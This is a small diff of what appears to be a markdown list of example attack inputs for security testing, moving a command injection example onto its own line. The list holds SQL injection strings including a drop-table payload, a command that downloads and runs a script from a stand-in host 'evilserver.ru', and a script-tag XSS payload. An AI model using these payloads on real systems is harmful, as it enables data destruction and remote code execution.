@@ -24,7 +24,8 @@ SQL Injection: `foo‘ or 1=1;-- `
 
 SQL Injection: `foo‘; drop table students;--`  
 
-Command Injection: `cd /tmp; wget http://evilserver.ru/runme.sh chmod 666 /tmp/runme.sh; bash /tmp/runme.sh; rm /tmp/runme.sh`  
+Command Injection:  
+`cd /tmp; wget http://evilserver.ru/runme.sh chmod 666 /tmp/runme.sh; bash /tmp/runme.sh; rm /tmp/runme.sh`  
 
 Cross-Site Scripting: `<script>alert(‘xss’);</script>`  
 
